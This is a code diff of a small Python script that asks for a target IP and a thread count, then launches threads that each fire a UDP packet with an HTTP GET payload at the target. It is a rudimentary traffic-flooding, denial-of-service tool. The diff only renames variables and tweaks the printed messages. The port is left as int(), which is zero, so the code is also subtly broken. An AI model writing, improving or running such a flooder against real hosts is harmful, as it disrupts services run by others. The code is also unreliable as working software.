@@ -2,22 +2,27 @@ import threading
 import socket
 
 ip = socket.gethostbyname(input("IP: "))
-byte_s = int(input("Bytes: "))
+threads = int(input("Threads: "))
+
 port = int()
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 
 def udp():
     try:
-        s.sendto(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode(), (ip, port))
-        print("\033[32m[+]\033[0mUDP Packet sent!")
+        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
+
+        s.sendto(request, (ip, port))
+        print("\033[32m[+]\033[0m UDP Packet sent ->", ip)
+
     except Exception as err:
-        print(err)
+        print("\033[31m[-]\033[0m", err)
 
 
-for i in range(byte_s):
-    thread = threading.Thread(target=udp)
-    thread.start()
+for i in range(threads):
+    t = threading.Thread(target=udp)
+    t.start()
 
-input("\nPress any key to continue . . . ")
+input("")
